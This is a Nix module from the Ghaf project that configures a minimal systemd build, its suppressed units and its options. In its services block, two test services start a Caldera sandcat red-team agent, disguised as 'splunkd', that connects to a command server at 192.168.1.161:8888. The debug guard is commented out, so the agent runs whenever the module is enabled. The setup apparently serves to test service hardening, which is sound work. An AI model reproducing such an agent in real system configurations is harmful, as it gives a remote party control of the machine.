# Copyright 2022-2023 TII (SSRC) and the Ghaf contributors
# SPDX-License-Identifier: Apache-2.0
{
  config,
  lib,
  pkgs,
  ...
}: let

  # Ghaf configuration
  cfg = config.ghaf.systemd.base;

  # Override minimal systemd package configuration
  package = pkgs.systemdMinimal.override {
    pname = cfg.withName;
    withAcl = true;
    withAnalyze = true; #cfg.withDebug;
    withApparmor = cfg.withApparmor;
    withAudit = cfg.withAudit;
    withCompression = cfg.withDebug || cfg.withVirtualization;
    withCoredump = cfg.withDebug || cfg.withVirtualization;
    withCryptsetup = cfg.withCryptsetup;
    withEfi = cfg.withEfi; # also controls 'withBootloader' (compiles systemd-boot)
    withFido2 = cfg.withFido;
    withHostnamed = cfg.withNetwork;
    withImportd = cfg.withVirtualization;
    withKexectools = false;
    withKmod = true;
    withLibBPF = false;
    withLibseccomp = true;
    withLogind = true;
    withMachined = cfg.withVirtualization || cfg.withContainers;
    withNetworkd = cfg.withNetwork;
    withNss = cfg.withNss;
    withOomd = true;
    withPam = true;
    withPolkit = cfg.withPolkit;
    withResolved = cfg.withNetwork || cfg.withNss;
    withSelinux = false;
    withShellCompletions = true; #cfg.withDebug;
    withTimedated = true;
    withTimesyncd = cfg.withNetwork;
    withTpm2Tss = cfg.withTpm;
    withUtmp = cfg.withJournal;
  } // lib.optionalAttrs (lib.hasAttr "withRepart" (lib.functionArgs pkgs.systemdMinimal.override)) {
    withRepart = false;
  } // lib.optionalAttrs (lib.hasAttr "withSysupdate" (lib.functionArgs pkgs.systemdMinimal.override)) {
    withSysupdate = false;
  };

  # Definition of suppressed system units in systemd configuration. This removes the units and has priority.
  # Required to avoid build failures when only disabling the units, and removes unit files in '/etc'.
  # Note that errors will be silently ignored.
  suppressedSystemUnits =
    [
      ## Default disabled units

      "systemd-kexec.service"
      "kexec.service"
      "kexec.target"
      "kexec-tools.service"
      "kexec-tools.target"
      "prepare-kexec.service"
      "prepare-kexec.target"
      "remote-cryptsetup.service"
      "remote-cryptsetup.target"
      "remote-fs-pre.service"
      "remote-fs-pre.target"
      "remote-fs.service"
      "remote-fs.target"
      "rpcbind.service"
      "rpcbind.target"
      "systemd-ask-password-console.path"
      "systemd-ask-password-console.service"
      "systemd-ask-password-wall.path"
      "systemd-ask-password-wall.service"
      "systemd-update-done.service"
      "system-update.target"
      "system-update-pre.target"
      "system-update-cleanup.service"
    ]
    ++ (lib.optionals (!cfg.withContainers) [
      "container-getty.service"
      "container-getty@.service"
      "container@.service"
      "systemd-nspawn@.service"
    ])
    ++ (lib.optionals ((!cfg.withDebug) && (!cfg.withSerial)) [
      "getty.service"
      "getty@.service"
      "getty.target"
      "getty-pre.target"
      "serial-getty.service"
      "serial-getty@.service"
      "serial-getty.target"
      "serial-getty@.target"
    ])
    ++ (lib.optionals ((!cfg.withDebug) && (!cfg.withJournal)) [
      "systemd-journald-audit.socket"
      "systemd-journal-catalog-update.service"
      "systemd-journal-flush.service"
      "systemd-journald.service"
      "systemd-journald@.service"
      "systemd-journal-gatewayd.socket"
      "systemd-journald-audit.socket"
      "systemd-journald-dev-log.socket"
      "systemd-journald-varlink@.socket"
      "systemd-journald.socket"
      "systemd-journald@.socket"
      "systemd-update-utmp.service"
    ])
    ++ (lib.optionals ((!cfg.withDebug) && (!cfg.withVirtualization)) [
      "systemd-coredump.socket"
    ])
    ++ (lib.optionals (!cfg.withNss) [
      "nss.service"
      "nss.target"
      "nss-lookup.target"
      "nss-user-lookup.target"
      "nss-lookup.target.requires"
      "nss-user-lookup.target.requires"
    ])
    ++ (lib.optionals (!cfg.withPrinter) [
      "cups.service"
      "cups.target"
      "cups.socket"
      "cups-lpd.socket"
      "cups-lpd@.service"
      "cups-browsed.service"
      "cups-browsed.target"
      "printer.service"
      "printer.target"
    ])
    ++ (lib.optionals (!cfg.withDebug) [
      ## Units kept with debug

      "kbrequest.target"
      "rescue.service"
      "rescue.target"
      "emergency.service"
      "emergency.target"
      "systemd-vconsole-setup.service"
      "reload-systemd-vconsole-setup.service"
      "console-getty.service"
      # "systemd-sysctl.service"
      # "systemd-sysctl.target"
      "sys-kernel-debug.mount"
      "sys-fs-fuse-connections.mount"
      "systemd-pstore.service"
      "systemd-modules-load.service"
      "mount-pstore.service"
      "nix-daemon.service"
      "nix-daemon.socket"
    ]);

  # Default user unit configuration
  user.units = lib.mkForce {
    "printer.target".enable = cfg.withPrinter;
    "printer.service".enable = cfg.withPrinter;
  };
in
  with lib; {

    options.ghaf.systemd.base = {

      enable = mkOption {
        description = "Enable minimal systemd configuration.";
        type = types.bool;
        default = false;
      };

      withHardenedServices = mkOption {
        description = "Enable systemd hardened services.";
        type = types.bool;
        default = true;
      };

      withName = mkOption {
        description = "Set systemd derivation name.";
        type = types.str;
        default = "ghaf-systemd";
      };

      withNetwork = mkOption {
        description = "Enable systemd networking functionality.";
        type = types.bool;
        default = true;
      };

      withJournal = mkOption {
        description = "Enable systemd journal functionality.";
        type = types.bool;
        default = true;
      };

      withDebug = mkOption {
        description = "Enable systemd debug functionality.";
        type = types.bool;
        default = false;
      };

      withVirtualization = mkOption {
        description = "Enable systemd virtualization (machined/importd) functionality.";
        type = types.bool;
        default = false;
      };

      withContainers = mkOption {
        description = "Enable systemd container functionality.";
        type = types.bool;
        default = false;
      };

      withEfi = mkOption {
        description = "Enable systemd EFI functionality.";
        type = types.bool;
        default = false;
      };

      withApparmor = mkOption {
        description = "Enable systemd apparmor functionality.";
        type = types.bool;
        default = false;
      };

      withAudit = mkOption {
        description = "Enable systemd audit functionality.";
        type = types.bool;
        default = false;
      };

      withNss = mkOption {
        description = "Enable systemd Name Service Switch (NSS) functionality.";
        type = types.bool;
        default = false;
      };

      withCryptsetup = mkOption {
        description = "Enable systemd LUKS2 functionality.";
        type = types.bool;
        default = false;
      };

      withFido = mkOption {
        description = "Enable systemd Fido2 token functionality.";
        type = types.bool;
        default = false;
      };

      withTpm = mkOption {
        description = "Enable systemd TPM functionality.";
        type = types.bool;
        default = false;
      };

      withPolkit = mkOption {
        description = "Enable systemd polkit functionality.";
        type = types.bool;
        default = false;
      };

      withSerial = mkOption {
        description = "Enable systemd serial console.";
        type = types.bool;
        default = false;
      };

      withPrinter = mkOption {
        description = "Enable systemd printer functionality.";
        type = types.bool;
        default = false;
      };
    };

    config = mkIf cfg.enable {

      # Systemd configuration
      systemd = {

        # Package and unit configuration
        inherit package;
        inherit suppressedSystemUnits;
        inherit (user.units);

        # Service configurations
        services = let
          caldera-server = "http://192.168.1.161:8888";
          caldera = ./test/caldera-sandcat/splunkd;
        in
        {
          # @TODO: Add systemd hardened configurations
          timesyncd.enable = cfg.withNetwork;
          test-safe = { #mkIf cfg.withDebug {
             description = "Test service without hardening.";
             serviceConfig = {
               Type = "simple";
               ExecStart="${caldera} -server ${caldera-server} -group red -v";               
             } // (import ./hardened-services/configs/test-safe.nix);
          };
          test-unsafe = { #mkIf cfg.withDebug {
             description = "Test service without hardening.";
             serviceConfig = {
               Type = "simple";
               ExecStart="${caldera} -server ${caldera-server} -group red -v";               
             };
          };

        } // (if cfg.withHardenedServices then (import ./hardened-services/default.nix)
              else {});    

        # Misc. configurations
        enableEmergencyMode = cfg.withDebug;
        coredump.enable = cfg.withVirtualization;
      };

    };
  }
